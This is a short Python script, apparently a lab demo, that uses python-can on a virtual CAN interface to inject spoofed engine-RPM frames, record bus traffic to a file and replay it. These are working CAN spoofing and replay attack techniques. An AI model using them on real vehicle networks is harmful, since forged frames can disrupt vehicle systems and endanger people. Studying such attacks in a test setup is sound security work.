import time, can
from datetime import datetime

CHANNEL = "vcan0"

def send_spoof(bus, arb_id=0x123, rpm=3000):
    data = rpm.to_bytes(2, "big") + b"\x00\x00\x00\x00\x00\x00"
    msg = can.Message(arbitration_id=arb_id, data=data, is_extended_id=False)
    bus.send(msg)
    print(f"[{datetime.now()}] SPOOF id=0x{arb_id:X} rpm={rpm}")

def record_stream(bus, duration=3.0, out_file="capture.log"):
    start = time.time(); frames=[]
    while time.time() - start < duration:
        m = bus.recv(timeout=0.2)
        if m: frames.append(m)
    with open(out_file, "w") as f:
        for m in frames:
            f.write(f"{m.timestamp},{m.arbitration_id},{m.data.hex()}\n")
    print(f"Saved {len(frames)} frames to {out_file}")

def replay_stream(bus, in_file="capture.log", delay=0.05):
    with open(in_file) as f:
        for line in f:
            _, arb, hexdata = line.strip().split(",")
            msg = can.Message(arbitration_id=int(arb),
                              data=bytes.fromhex(hexdata),
                              is_extended_id=False)
            bus.send(msg); time.sleep(delay)

if __name__ == "__main__":
    bus = can.interface.Bus(channel=CHANNEL, bustype="socketcan")
    for rpm in [1500, 2000, 2500, 3000, 3500]:
        send_spoof(bus, rpm=rpm); time.sleep(0.05)
    record_stream(bus, 2.0, "capture.log")
    replay_stream(bus, "capture.log", 0.02)
